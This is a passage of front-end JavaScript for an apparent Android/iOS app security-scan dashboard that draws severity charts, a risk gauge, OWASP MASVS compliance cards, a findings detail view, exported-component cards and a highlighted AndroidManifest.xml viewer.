  const platform = r.platform || 'Android';
  const s = r.summary || {};
  const findings = r.findings || [];
  const e = r.extras || {};
  const ec = e.exported_components || [];

  // ---- Application Metadata table ----
  const rows = [
    ['Package / Bundle', m.package],
    ['Version', (m.version_name||'') + (m.version_code ? ' ('+m.version_code+')' : '')],
    ['Platform', platform + (m.min_sdk ? ' (min ' + (platform === 'iOS' ? 'iOS ' : 'SDK ') + m.min_sdk + ')' : '')],
    ['File size', m.apk_size_bytes ? (m.apk_size_bytes/1024/1024).toFixed(1) + ' MB' : ''],
  ];
  $('#meta-table').innerHTML = rows.filter(([k,v]) => v).map(([k,v]) =>
    `<tr><td style="width:140px;color:var(--muted)">${esc(k)}</td><td><code class="inline">${esc(v ?? '')}</code></td></tr>`
  ).join('');

  // ---- Severity Distribution: donut chart ----
  drawSeverityDonut('#severity-chart', s);

  // ---- Risk Gauge ----
  drawRiskGauge('#risk-gauge', s);

  // ---- Findings by Category: horizontal bar chart ----
  drawCategoryChart('#category-chart', findings);

  // ---- Attack Surface: STRUCTURAL only (severities are already in KPI strip above) ----
  const counts = {
    activity: ec.filter(c => c.tag === 'activity' || c.tag === 'activity-alias').length,
    service:  ec.filter(c => c.tag === 'service').length,
    receiver: ec.filter(c => c.tag === 'receiver').length,
    provider: ec.filter(c => c.tag === 'provider').length,
  };
  const secrets = findings.filter(f =>
    (f.id||'').startsWith('secret-') || (f.id||'').startsWith('ios-secret-')).length;
  $('#attack-surface').innerHTML = `
    <div class="surface-grid">
      <div class="surface-card"><div class="value">${secrets}</div><div class="label">Secrets / API keys</div></div>
      <div class="surface-card"><div class="value">${(e.deeplinks||[]).length}</div><div class="label">Deep links</div></div>
      <div class="surface-card"><div class="value">${counts.activity}</div><div class="label">Exported activities</div></div>
      <div class="surface-card"><div class="value">${counts.service}</div><div class="label">Exported services</div></div>
      <div class="surface-card"><div class="value">${counts.receiver}</div><div class="label">Exported receivers</div></div>
      <div class="surface-card"><div class="value">${counts.provider}</div><div class="label">Content providers</div></div>
      <div class="surface-card"><div class="value">${(e.permissions||[]).length}</div><div class="label">Permissions</div></div>
    </div>`;

  // ---- MASVS Compliance: pass / warn / fail per category ----
  drawMasvsCompliance('#masvs-compliance', findings);
}

// ====== MASVS Compliance ======
function drawMasvsCompliance(selector, findings){
  // Map MASVS categories from MASVS-CODE / MASVS-CRYPTO etc. on each finding
  const categories = [
    {key: 'MASVS-STORAGE',    label: 'Storage',     desc: 'Local data protection'},
    {key: 'MASVS-CRYPTO',     label: 'Crypto',      desc: 'Cryptographic operations'},
    {key: 'MASVS-AUTH',       label: 'Auth',        desc: 'Authentication & sessions'},
    {key: 'MASVS-NETWORK',    label: 'Network',     desc: 'Communication security'},
    {key: 'MASVS-PLATFORM',   label: 'Platform',    desc: 'Platform interaction'},
    {key: 'MASVS-CODE',       label: 'Code',        desc: 'Code quality & build'},
    {key: 'MASVS-RESILIENCE', label: 'Resilience',  desc: 'Anti-tamper & runtime'},
    {key: 'MASVS-PRIVACY',    label: 'Privacy',     desc: 'Data minimisation'},
  ];

  const sevWeight = {critical: 4, high: 3, medium: 2, low: 1, info: 0};
  const stats = categories.map(c => {
    const matching = findings.filter(f => (f.category || '') === c.key);
    const counts = {critical: 0, high: 0, medium: 0, low: 0, info: 0};
    let maxSev = '';
    let weight = 0;
    for (const f of matching){
      if (counts[f.severity] !== undefined) counts[f.severity]++;
      if (sevWeight[f.severity] > sevWeight[maxSev || 'info']) maxSev = f.severity;
      weight += sevWeight[f.severity] || 0;
    }
    let status = 'pass';
    if (matching.length){
      if (maxSev === 'critical' || maxSev === 'high') status = 'fail';
      else if (maxSev === 'medium') status = 'warn';
      else status = 'minor';
    }
    return {...c, count: matching.length, counts, maxSev, weight, status};
  });

  $(selector).innerHTML = `<div class="masvs-grid">
    ${stats.map(s => {
      const statusLabel = {
        'pass':  'PASS',
        'minor': 'MINOR',
        'warn':  'NEEDS ATTENTION',
        'fail':  'NON-COMPLIANT',
      }[s.status];
      const statusIcon = {
        'pass':  '✓',
        'minor': '·',
        'warn':  '!',
        'fail':  '✕',
      }[s.status];
      return `<div class="masvs-card masvs-${s.status}" title="${esc(s.desc)}">
        <div class="masvs-head">
          <div class="masvs-status">${statusIcon}</div>
          <div>
            <div class="masvs-label">${esc(s.label)}</div>
            <div class="masvs-key">${esc(s.key)}</div>
          </div>
        </div>
        <div class="masvs-status-line">${statusLabel}</div>
        ${s.count ? `<div class="masvs-counts">
          ${s.counts.critical ? `<span class="mc-c"><b>${s.counts.critical}</b> crit</span>` : ''}
          ${s.counts.high ? `<span class="mc-h"><b>${s.counts.high}</b> high</span>` : ''}
          ${s.counts.medium ? `<span class="mc-m"><b>${s.counts.medium}</b> med</span>` : ''}
          ${s.counts.low ? `<span class="mc-l"><b>${s.counts.low}</b> low</span>` : ''}
        </div>` : '<div class="masvs-counts dim">no findings</div>'}
      </div>`;
    }).join('')}
  </div>
  <div class="dim" style="font-size:11px;margin-top:10px;line-height:1.5">
    Status is heuristic, derived from finding severity per category.
    PASS = no findings · MINOR = info/low only · NEEDS ATTENTION = medium present · NON-COMPLIANT = high or critical present.
    Reference: <a href="https://owasp.org/www-project-mobile-app-security/" target="_blank" style="color:var(--accent-2)">OWASP MASVS</a>.
  </div>`;
}

// ====== Diagrams (inline SVG, no library) ======
function drawSeverityDonut(selector, summary){
  const data = [
    {key: 'critical', label: 'Critical', value: summary.critical || 0, color: '#f85149'},
    {key: 'high',     label: 'High',     value: summary.high || 0,     color: '#db6d28'},
    {key: 'medium',   label: 'Medium',   value: summary.medium || 0,   color: '#d29922'},
    {key: 'low',      label: 'Low',      value: summary.low || 0,      color: '#3fb950'},
    {key: 'info',     label: 'Info',     value: summary.info || 0,     color: '#8b949e'},
  ];
  const total = data.reduce((a, b) => a + b.value, 0);
  const cx = 100, cy = 100, r = 70, sw = 22;

  let svg = '<svg viewBox="0 0 360 200" width="100%" height="200" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg">';
  // Donut arcs
  if (total === 0){
    svg += `<circle cx="${cx}" cy="${cy}" r="${r}" fill="none" stroke="#30363d" stroke-width="${sw}"/>`;
    svg += `<text x="${cx}" y="${cy-2}" text-anchor="middle" font-size="22" font-weight="700" fill="#8b949e" font-family="ui-monospace,monospace">0</text>`;
    svg += `<text x="${cx}" y="${cy+18}" text-anchor="middle" font-size="10" fill="#8b949e" letter-spacing="1.5" text-transform="uppercase">FINDINGS</text>`;
  } else {
    let angle = -90; // start at 12 o'clock
    for (const d of data){
      if (d.value === 0) continue;
      const slice = (d.value / total) * 360;
      const a1 = angle, a2 = angle + slice;
      const rad = (deg) => (deg * Math.PI) / 180;
      const x1 = cx + r * Math.cos(rad(a1)), y1 = cy + r * Math.sin(rad(a1));
      const x2 = cx + r * Math.cos(rad(a2)), y2 = cy + r * Math.sin(rad(a2));
      const large = slice > 180 ? 1 : 0;
      svg += `<path d="M ${x1.toFixed(2)} ${y1.toFixed(2)} A ${r} ${r} 0 ${large} 1 ${x2.toFixed(2)} ${y2.toFixed(2)}" stroke="${d.color}" stroke-width="${sw}" fill="none" stroke-linecap="butt"><title>${d.label}: ${d.value}</title></path>`;
      angle = a2;
    }
    svg += `<text x="${cx}" y="${cy-2}" text-anchor="middle" font-size="32" font-weight="700" fill="#e6edf3" font-family="ui-monospace,monospace">${total}</text>`;
    svg += `<text x="${cx}" y="${cy+22}" text-anchor="middle" font-size="9" fill="#8b949e" letter-spacing="1.5">FINDINGS</text>`;
  }
  // Legend on the right
  let legY = 38;
  for (const d of data){
    const pct = total > 0 ? ((d.value/total)*100).toFixed(0) : 0;
    svg += `<g transform="translate(220, ${legY})">`;
    svg += `<rect width="10" height="10" rx="2" fill="${d.color}"/>`;
    svg += `<text x="18" y="9" font-size="12" fill="#e6edf3">${d.label}</text>`;
    svg += `<text x="120" y="9" font-size="12" font-family="ui-monospace,monospace" fill="#8b949e" text-anchor="end">${d.value}  ${pct}%</text>`;
    svg += `</g>`;
    legY += 25;
  }
  svg += '</svg>';
  $(selector).innerHTML = svg;
}

function drawRiskGauge(selector, summary){
  const score = (summary.critical || 0) * 10 + (summary.high || 0) * 5
              + (summary.medium || 0) * 2 + (summary.low || 0);
  const label = score >= 30 ? 'CRITICAL' : score >= 15 ? 'HIGH' : score >= 5 ? 'MEDIUM' : 'LOW';
  const color = {CRITICAL:'#f85149', HIGH:'#db6d28', MEDIUM:'#d29922', LOW:'#3fb950'}[label];

  // Semi-circular gauge from -180 to 0 deg
  const cx = 180, cy = 130, r = 90, sw = 20;
  const maxScore = 50; // anything above 50 is full red
  const pct = Math.min(1, score / maxScore);
  const startA = -180, endA = -180 + (180 * pct);
  const rad = d => d * Math.PI / 180;
  const x1 = cx + r * Math.cos(rad(startA)), y1 = cy + r * Math.sin(rad(startA));
  const x2 = cx + r * Math.cos(rad(endA)),   y2 = cy + r * Math.sin(rad(endA));
  const xEnd = cx + r * Math.cos(rad(0)),    yEnd = cy + r * Math.sin(rad(0));
  const large = (endA - startA) > 180 ? 1 : 0;

  let svg = '<svg viewBox="0 0 360 200" width="100%" height="200" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg">';
  // Background arc
  svg += `<path d="M ${x1.toFixed(2)} ${y1.toFixed(2)} A ${r} ${r} 0 1 1 ${xEnd.toFixed(2)} ${yEnd.toFixed(2)}" stroke="#30363d" stroke-width="${sw}" fill="none" stroke-linecap="round"/>`;
  // Filled arc
  if (pct > 0){
    svg += `<path d="M ${x1.toFixed(2)} ${y1.toFixed(2)} A ${r} ${r} 0 ${large} 1 ${x2.toFixed(2)} ${y2.toFixed(2)}" stroke="${color}" stroke-width="${sw}" fill="none" stroke-linecap="round"/>`;
  }
  // Tick marks
  for (let i = 0; i <= 4; i++){
    const a = -180 + (i * 45);
    const tx1 = cx + (r - 8) * Math.cos(rad(a)), ty1 = cy + (r - 8) * Math.sin(rad(a));
    const tx2 = cx + (r + 8) * Math.cos(rad(a)), ty2 = cy + (r + 8) * Math.sin(rad(a));
    svg += `<line x1="${tx1.toFixed(2)}" y1="${ty1.toFixed(2)}" x2="${tx2.toFixed(2)}" y2="${ty2.toFixed(2)}" stroke="#30363d" stroke-width="1.5"/>`;
  }
  // Score and label
  svg += `<text x="${cx}" y="${cy-5}" text-anchor="middle" font-size="38" font-weight="700" font-family="ui-monospace,monospace" fill="#e6edf3">${score}</text>`;
  svg += `<text x="${cx}" y="${cy+18}" text-anchor="middle" font-size="11" fill="${color}" font-weight="700" letter-spacing="2.5">${label} RISK</text>`;
  svg += `<text x="${cx-r-10}" y="${cy+15}" font-size="10" fill="#8b949e" font-family="ui-monospace,monospace">0</text>`;
  svg += `<text x="${cx+r+8}" y="${cy+15}" font-size="10" fill="#8b949e" font-family="ui-monospace,monospace">${maxScore}+</text>`;
  svg += `<text x="${cx}" y="${cy+50}" text-anchor="middle" font-size="10.5" fill="#8b949e">weighted: 10×crit + 5×high + 2×med + low</text>`;
  svg += '</svg>';
  $(selector).innerHTML = svg;
}

function drawCategoryChart(selector, findings){
  // Group by category, top 8
  const counts = {};
  for (const f of findings){
    const cat = (f.category || 'OTHER').replace(/^MASVS-/, '');
    counts[cat] = (counts[cat] || 0) + 1;
  }
  const sorted = Object.entries(counts).sort((a, b) => b[1] - a[1]).slice(0, 8);
  if (!sorted.length){
    $(selector).innerHTML = '<div class="dim" style="padding:24px;text-align:center">No categorised findings.</div>';
    return;
  }
  const max = Math.max(...sorted.map(s => s[1]));
  const ROWH = 28, BARW = 220, LBLW = 120, PAD = 8;
  const h = sorted.length * ROWH + 16;

  let svg = `<svg viewBox="0 0 ${LBLW + BARW + 60} ${h}" width="100%" height="${h}" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg">`;
  let y = PAD;
  const palette = ['#2f81f7','#58a6ff','#3fb950','#d29922','#db6d28','#f85149','#a371f7','#ff7b72'];
  for (let i = 0; i < sorted.length; i++){
    const [cat, n] = sorted[i];
    const barW = (n / max) * BARW;
    const color = palette[i % palette.length];
    svg += `<text x="${LBLW - 8}" y="${y + ROWH/2 + 4}" text-anchor="end" font-size="11.5" fill="#c9d1d9" font-family="ui-monospace,monospace">${esc(cat)}</text>`;
    svg += `<rect x="${LBLW}" y="${y + 4}" width="${BARW}" height="${ROWH - 10}" rx="3" fill="#30363d33"/>`;
    svg += `<rect x="${LBLW}" y="${y + 4}" width="${barW.toFixed(2)}" height="${ROWH - 10}" rx="3" fill="${color}"><title>${esc(cat)}: ${n}</title></rect>`;
    svg += `<text x="${LBLW + BARW + 8}" y="${y + ROWH/2 + 4}" font-size="12" font-weight="700" fill="#e6edf3" font-family="ui-monospace,monospace">${n}</text>`;
    y += ROWH;
  }
  svg += '</svg>';
  $(selector).innerHTML = svg;
}

// ====== Findings ======
function renderFindings(){
  const all = STATE.report?.findings || [];
  const cats = [...new Set(all.map(f => f.category).filter(Boolean))].sort();
  const catSel = $('#f-cat');
  if (catSel.children.length <= 1){
    catSel.innerHTML = '<option value="">All categories</option>' + cats.map(c => `<option value="${esc(c)}">${esc(c)}</option>`).join('');
  }

  const q = $('#f-search').value.toLowerCase();
  const sv = $('#f-sev').value, ct = $('#f-cat').value;
  const list = all.filter(f => {
    if (sv && f.severity !== sv) return false;
    if (ct && f.category !== ct) return false;
    if (!q) return true;
    return (f.title + ' ' + f.description + ' ' + (f.evidence||'') + ' ' + (f.cwe||'')).toLowerCase().includes(q);
  });

  $('#f-count').textContent = list.length + ' / ' + all.length;
  const tbody = $('#findings-tbl tbody');
  tbody.innerHTML = list.map((f, i) =>
    `<tr data-i="${all.indexOf(f)}">
      <td><span class="sev-tag ${esc(f.severity)}">${esc(f.severity.toUpperCase())}</span></td>
      <td>${esc(f.title)} ${f.confidence ? `<span class="conf-pill ${esc(f.confidence)}">${esc(f.confidence)}</span>` : ''}</td>
      <td><span class="cwe-tag">${esc(f.cwe || '—')}</span></td>
    </tr>`).join('');
  tbody.querySelectorAll('tr').forEach(tr => {
    tr.onclick = () => openDetail(parseInt(tr.dataset.i));
  });
}

function openDetail(idx){
  const f = STATE.report.findings[idx];
  if (!f) return;
  STATE.selectedFinding = idx;
  $$('#findings-tbl tbody tr').forEach(tr => tr.classList.toggle('active', parseInt(tr.dataset.i) === idx));
  $('#findings-layout').classList.add('detail-open');
  $('#d-sev').className = 'sev-tag ' + esc(f.severity);
  $('#d-sev').textContent = f.severity.toUpperCase();
  $('#d-title').textContent = f.title;

  // Pills row at top: confidence, CVSS, CVE
  let pills = '';
  if (f.confidence) pills += `<span class="conf-pill ${esc(f.confidence)}">${esc(f.confidence)}</span> `;
  if (f.cvss)       pills += `<span class="cvss-pill">CVSS ${esc(f.cvss.toFixed(1))}</span> `;
  if (f.cve)        pills += `<span class="cve-pill">${esc(f.cve)}</span> `;

  $('#d-body').innerHTML = `
    ${pills ? `<section style="margin-bottom:10px">${pills}</section>` : ''}
    <section><h4>Description</h4><p>${esc(f.description)}</p></section>
    ${f.impact ? `<section><h4>Impact</h4><p>${esc(f.impact)}</p></section>` : ''}
    ${f.evidence ? `<section><h4>Evidence</h4><pre>${esc(f.evidence)}</pre></section>` : ''}
    ${f.fix ? `<section><h4>Fix</h4><p style="white-space:pre-wrap">${esc(f.fix)}</p></section>`
            : (f.recommendation ? `<section><h4>Recommendation</h4><p>${esc(f.recommendation)}</p></section>` : '')}
    <section><h4>Classification</h4>
      <p>${f.cve ? `<span class="cve-pill">${esc(f.cve)}</span> ` : ''}
         ${f.cvss ? `<span class="cvss-pill">CVSS ${esc(f.cvss.toFixed(1))}</span> ` : ''}
         ${f.cwe ? `<span class="cwe-tag">${esc(f.cwe)}</span> ` : ''}
         ${f.masvs ? `<span class="cwe-tag">${esc(f.masvs)}</span> ` : ''}
         ${f.category ? `<span class="cwe-tag">${esc(f.category)}</span>` : ''}</p>
    </section>
    ${(f.references||[]).length ? `<section><h4>References</h4>${f.references.map(u => `<p><a href="${esc(u)}" target="_blank">${esc(u)}</a></p>`).join('')}</section>` : ''}
  `;
}

function closeDetail(){
  $('#findings-layout').classList.remove('detail-open');
  $$('#findings-tbl tbody tr').forEach(tr => tr.classList.remove('active'));
  STATE.selectedFinding = null;
}

// ====== Components ======
// Rich Components: fetched from /api/scan/{sid}/manifest_components,
// shows full per-component details (exported state, intent filters, permissions, etc.)
let _COMPONENTS_DATA = null;
let _COMPONENT_FILTER = 'all'; // 'all' | 'exported' | 'with-filters' | 'with-permission'

async function renderComponents(m){
  const box = $('#components-content');
  box.innerHTML = `
    <div class="box" style="margin-bottom:12px">
      <div class="row" style="justify-content:space-between;flex-wrap:wrap;gap:10px">
        <div>
          <div style="font-weight:600;font-size:13px;margin-bottom:4px">App Components (parsed from AndroidManifest.xml)</div>
          <div class="dim" style="font-size:11.5px">Each component shows its actual manifest attributes — exported state, intent filters, required permissions, and more.</div>
        </div>
        <button class="btn" onclick="document.querySelector('[data-view=manifest]').click()">View full AndroidManifest.xml →</button>
      </div>
    </div>
    <div class="dim" style="padding:24px;text-align:center" id="comp-loading">Loading components from AndroidManifest.xml…</div>`;

  try {
    const r = await fetch('/api/scan/' + STATE.scanId + '/manifest_components');
    if (!r.ok){
      const j = await r.json().catch(() => ({}));
      box.innerHTML = `<div class="box"><div style="color:var(--bad)">Failed to load components: ${esc(j.detail || 'HTTP ' + r.status)}</div></div>`;
      return;
    }
    const data = await r.json();
    _COMPONENTS_DATA = data;
    _renderComponentsView();
  } catch (e) {
    box.innerHTML = `<div class="box"><div style="color:var(--bad)">Error: ${esc(e.message)}</div></div>`;
  }
}

function _renderComponentsView(){
  const data = _COMPONENTS_DATA;
  if (!data) return;
  const c = data.components;

  // Counts
  const counts = {
    activities: c.activities.length,
    services:   c.services.length,
    receivers:  c.receivers.length,
    providers:  c.providers.length,
  };
  const totalExported = ['activities','services','receivers','providers']
    .reduce((sum, k) => sum + c[k].filter(x => x.exported).length, 0);
  const totalFilters = ['activities','services','receivers','providers']
    .reduce((sum, k) => sum + c[k].filter(x => (x.intent_filters||[]).length).length, 0);
  const totalPerms = ['activities','services','receivers','providers']
    .reduce((sum, k) => sum + c[k].filter(x => x.permission).length, 0);
  const total = counts.activities + counts.services + counts.receivers + counts.providers;
  if ($('#badge-components')) $('#badge-components').textContent = total;

  // Header + filter toolbar
  let html = `
    <div class="box" style="margin-bottom:12px">
      <div class="row" style="justify-content:space-between;flex-wrap:wrap;gap:10px">
        <div>
          <div style="font-weight:600;font-size:13px;margin-bottom:4px">App Components (parsed from AndroidManifest.xml)</div>
          <div class="dim" style="font-size:11.5px">Each component shows its actual manifest attributes — exported state, intent filters, required permissions.</div>
        </div>
        <button class="btn" onclick="document.querySelector('[data-view=manifest]').click()">View full AndroidManifest.xml →</button>
      </div>
    </div>

    <div class="overview-grid" style="margin-bottom:12px">
      <div class="surface-card" style="min-height:auto;cursor:pointer" onclick="filterComponents('all')">
        <div class="value">${total}</div><div class="label">Total components</div>
      </div>
      <div class="surface-card" style="min-height:auto;cursor:pointer" onclick="filterComponents('exported')">
        <div class="value" style="color:var(--high)">${totalExported}</div><div class="label">Exported (attack surface)</div>
      </div>
      <div class="surface-card" style="min-height:auto;cursor:pointer" onclick="filterComponents('with-filters')">
        <div class="value" style="color:var(--accent-2)">${totalFilters}</div><div class="label">With intent filters</div>
      </div>
      <div class="surface-card" style="min-height:auto;cursor:pointer" onclick="filterComponents('with-permission')">
        <div class="value" style="color:var(--low)">${totalPerms}</div><div class="label">Permission-protected</div>
      </div>
    </div>

    <div class="comp-toolbar">
      <span class="dim" style="font-size:11px">Filter:</span>
      <button class="comp-filter-btn ${_COMPONENT_FILTER==='all'?'active':''}" onclick="filterComponents('all')">All (${total})</button>
      <button class="comp-filter-btn ${_COMPONENT_FILTER==='exported'?'active':''}" onclick="filterComponents('exported')">Exported (${totalExported})</button>
      <button class="comp-filter-btn ${_COMPONENT_FILTER==='with-filters'?'active':''}" onclick="filterComponents('with-filters')">With filters (${totalFilters})</button>
      <button class="comp-filter-btn ${_COMPONENT_FILTER==='with-permission'?'active':''}" onclick="filterComponents('with-permission')">With permission (${totalPerms})</button>
    </div>
  `;

  // Each section
  const sections = [
    ['activities', 'Activities', 'activity'],
    ['services', 'Services', 'service'],
    ['receivers', 'Receivers', 'receiver'],
    ['providers', 'Providers', 'provider'],
  ];
  for (const [key, label, tag] of sections){
    const list = c[key].filter(x => {
      if (_COMPONENT_FILTER === 'all') return true;
      if (_COMPONENT_FILTER === 'exported') return x.exported;
      if (_COMPONENT_FILTER === 'with-filters') return (x.intent_filters || []).length > 0;
      if (_COMPONENT_FILTER === 'with-permission') return !!x.permission;
      return true;
    });
    if (!list.length && _COMPONENT_FILTER !== 'all') continue;
    html += `<div class="box" style="margin-bottom:12px">
      <h3 style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px">
        <span>${label} <span class="dim" style="font-weight:400;font-size:11px;letter-spacing:.5px">(${list.length}${_COMPONENT_FILTER!=='all'?' of '+c[key].length:''})</span></span>
      </h3>
      ${list.length ? list.map(comp => _renderCompCard(comp, tag)).join('') : '<div class="dim" style="padding:14px;font-size:12px">None match the current filter.</div>'}
    </div>`;
  }

  $('#components-content').innerHTML = html;
}

function filterComponents(filter){
  _COMPONENT_FILTER = filter;
  _renderComponentsView();
}

function _renderCompCard(comp, tag){
  const exported = comp.exported;
  const hasPerm = !!comp.permission;
  const cls = 'comp-card' + (exported ? ' exported' : '') + (hasPerm ? ' has-perm' : '');

  // Status pill
  let statusPill;
  if (exported && hasPerm){
    statusPill = `<span class="exp-pill" style="background:rgba(210,153,34,.14);color:#ffd58a;border-color:rgba(210,153,34,.3)">exported (perm-protected)</span>`;
  } else if (exported){
    statusPill = `<span class="exp-pill">exported</span>`;
  } else {
    statusPill = `<span class="exp-pill" style="background:rgba(63,185,80,.12);color:#7ee097;border-color:rgba(63,185,80,.3)">internal</span>`;
  }

  // Build meta row
  const meta = [];
  if (comp.permission) meta.push(`<span><span class="k">permission:</span><span class="v">${esc(comp.permission)}</span></span>`);
  if (comp.launch_mode) meta.push(`<span><span class="k">launchMode:</span><span class="v">${esc(comp.launch_mode)}</span></span>`);
  if (comp.task_affinity != null) meta.push(`<span><span class="k">taskAffinity:</span><span class="v">${esc(comp.task_affinity || '(empty)')}</span></span>`);
  if (comp.authorities) meta.push(`<span><span class="k">authorities:</span><span class="v">${esc(comp.authorities)}</span></span>`);
  if (comp.grant_uri_permissions === 'true') meta.push(`<span style="color:var(--high)"><span class="k">grantUriPermissions:</span><span class="v">true</span></span>`);
  if (comp.target_activity) meta.push(`<span><span class="k">target:</span><span class="v">${esc(comp.target_activity)}</span></span>`);

  // Intent filters
  let filtersHtml = '';
  if ((comp.intent_filters || []).length){
    filtersHtml = comp.intent_filters.map(f => {
      const rows = [];
      if (f.actions?.length){
        rows.push(`<div class="if-row"><span class="k">actions</span><span class="v">${f.actions.map(a => `<span class="if-tag">${esc(a)}</span>`).join('')}</span></div>`);
      }
      if (f.categories?.length){
        rows.push(`<div class="if-row"><span class="k">categories</span><span class="v">${f.categories.map(c => `<span class="if-tag">${esc(c)}</span>`).join('')}</span></div>`);
      }
      if (f.data?.length){
        const dataLines = f.data.map(d => {
          const parts = Object.entries(d).map(([k, v]) => `${k}="${esc(v)}"`).join(' ');
          return `<span class="if-tag">&lt;data ${parts}/&gt;</span>`;
        }).join(' ');
        rows.push(`<div class="if-row"><span class="k">data</span><span class="v">${dataLines}</span></div>`);
      }
      const meta = [];
      if (f.priority) meta.push(`priority=${f.priority}`);
      if (f.auto_verify === 'true') meta.push(`autoVerify=true`);
      if (meta.length) rows.push(`<div class="if-row"><span class="k">flags</span><span class="v">${meta.join(', ')}</span></div>`);
      return `<div class="comp-filter">${rows.join('')}</div>`;
    }).join('');
  }

  return `<div class="${cls}">
    <div class="comp-card-head">
      <span class="comp-card-tag">&lt;${esc(tag)}&gt;</span>
      <span class="comp-card-name">${esc(comp.name)}</span>
      ${statusPill}
      <a class="comp-jump-link" onclick="openManifestInTab('${esc(comp.name)}','${esc(tag)}'); return false">jump to manifest →</a>
    </div>
    ${meta.length ? `<div class="comp-meta-row">${meta.join('')}</div>` : ''}
    ${filtersHtml}
  </div>`;
}

// Manifest tab: full XML view + jump-to-component
let _MANIFEST_DATA = null;
async function loadManifestTab(jumpToName, jumpToTag){
  if (!STATE.scanId) return;
  const tocEl = $('#manifest-toc');
  const preEl = $('#manifest-content-tab');
  if (!_MANIFEST_DATA){
    preEl.textContent = 'Loading…';
    tocEl.innerHTML = '<div class="dim" style="padding:14px;font-size:11px;text-align:center">Loading…</div>';
    try {
      const [m1, m2] = await Promise.all([
        fetch('/api/scan/' + STATE.scanId + '/manifest').then(r => r.json()),
        fetch('/api/scan/' + STATE.scanId + '/manifest_components').then(r => r.json()),
      ]);
      if (m1.detail){ preEl.textContent = 'Error: ' + m1.detail; return; }
      _MANIFEST_DATA = {xml: m1.manifest, filename: m1.filename, components: m2.components || {}};
    } catch (e) {
      preEl.textContent = 'Failed to load: ' + e.message; return;
    }
  }
  const xml = _MANIFEST_DATA.xml;
  const c = _MANIFEST_DATA.components;
  $('#manifest-filename-tab').textContent = _MANIFEST_DATA.filename || 'AndroidManifest.xml';
  $('#manifest-stats-tab').textContent = `· ${(xml.length/1024).toFixed(1)} KB · ${xml.split('\n').length} lines`;

  // Render TOC (jump-to-component sidebar)
  const sections = [
    ['Activities', c.activities || [], 'activity'],
    ['Services', c.services || [], 'service'],
    ['Receivers', c.receivers || [], 'receiver'],
    ['Providers', c.providers || [], 'provider'],
  ];
  let toc = '';
  for (const [label, list, tag] of sections){
    if (!list.length) continue;
    toc += `<div class="toc-section">
      <div class="toc-section-h">${label} <span class="count">${list.length}</span></div>
      ${list.map(comp => `<div class="toc-item ${comp.exported?'exported':''}" data-name="${esc(comp.name)}" data-tag="${esc(tag)}" title="${comp.exported?'exported':'internal'}${comp.permission?' · permission: '+comp.permission:''}">${esc(comp.short_name || comp.name.split('.').pop())}</div>`).join('')}
    </div>`;
  }
  if (!toc) toc = '<div class="dim" style="padding:14px;font-size:11px;text-align:center">No components</div>';
  tocEl.innerHTML = toc;

  // Render highlighted XML
  let highlighted = highlightXml(xml);

  // If jumping to a specific component, highlight it
  if (jumpToName && jumpToTag){
    const escName = jumpToName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const shortName = jumpToName.includes('.') ? jumpToName.split('.').pop() : jumpToName;
    const escShort = shortName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const re = new RegExp(`(&lt;${jumpToTag}[^&]*android:name=&quot;\\.?(${escName}|${escShort})&quot;[\\s\\S]*?&lt;/${jumpToTag}&gt;|&lt;${jumpToTag}[^&]*android:name=&quot;\\.?(${escName}|${escShort})&quot;[^&]*/&gt;)`, 'i');
    const match = highlighted.match(re);
    if (match){
      highlighted = highlighted.replace(match[0], `<span id="comp-anchor-tab" class="comp-highlight">${match[0]}</span>`);
    }
  }
  preEl.innerHTML = highlighted;

  if (jumpToName && jumpToTag){
    setTimeout(() => {
      const t = $('#comp-anchor-tab');
      if (t) t.scrollIntoView({block: 'center', behavior: 'smooth'});
    }, 100);
  }

  // Wire TOC clicks
  $$('.toc-item').forEach(it => {
    it.onclick = () => loadManifestTab(it.dataset.name, it.dataset.tag);
  });

  // Wire toolbar buttons
  $('#manifest-copy-tab').onclick = () => {
    navigator.clipboard.writeText(xml).then(() => {
      $('#manifest-copy-tab').textContent = 'Copied!';
      setTimeout(() => $('#manifest-copy-tab').textContent = 'Copy', 1500);
    });
  };
  $('#manifest-download-tab').onclick = () => {
    const blob = new Blob([xml], {type: 'application/xml'});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = _MANIFEST_DATA.filename || 'AndroidManifest.xml';
    document.body.appendChild(a); a.click();
    setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 1000);
  };

  // Wire search
  const searchInput = $('#manifest-search-tab');
  searchInput.oninput = () => {
    const q = searchInput.value.trim();
    if (!q){
      preEl.innerHTML = highlighted;
      return;
    }
    const escQ = q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const re = new RegExp(escQ, 'gi');
    preEl.innerHTML = highlighted.replace(re, m => `<span class="search-hit">${m}</span>`);
  };
  searchInput.value = ''; // reset on each load
}

// Bridge: jump from Components tab into Manifest tab
function openManifestInTab(name, tag){
  document.querySelector('[data-view=manifest]').click();
  setTimeout(() => loadManifestTab(name, tag), 80);
}

// Legacy modal viewer (kept for backwards compat from anywhere else)
async function openManifestViewer(componentName, componentTag){
  // Just route into the Manifest tab now
  openManifestInTab(componentName, componentTag);
}

// Lightweight XML syntax highlighter
function highlightXml(xml){
  // First HTML-escape
  let h = String(xml || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  // Comments
  h = h.replace(/&lt;!--[\s\S]*?--&gt;/g, m => `<span class="x-com">${m}</span>`);
  // Tags + attributes
  h = h.replace(/(&lt;\/?)([a-zA-Z][\w:.\-]*)((?:\s+[\w:\-]+(?:=&quot;[^&]*?&quot;)?)*)\s*(\/?&gt;)/g,
    (mt, open, tag, attrs, close) => {
      const styledAttrs = attrs.replace(/(\s+)([\w:\-]+)(=)?(&quot;([^&]*)&quot;)?/g,
        (m, sp, name, eq, val, content) =>
          `${sp}<span class="x-attr">${name}</span>${eq ? `<span class="x-eq">=</span>` : ''}${val ? `<span class="x-val">${val}</span>` : ''}`);
      return `<span class="x-punct">${open}</span><span class="x-tag">${tag}</span>${styledAttrs}<span class="x-punct">${close}</span>`;
    });
  return h;
}

// ====== Deep links ======
function renderDeeplinks(list){
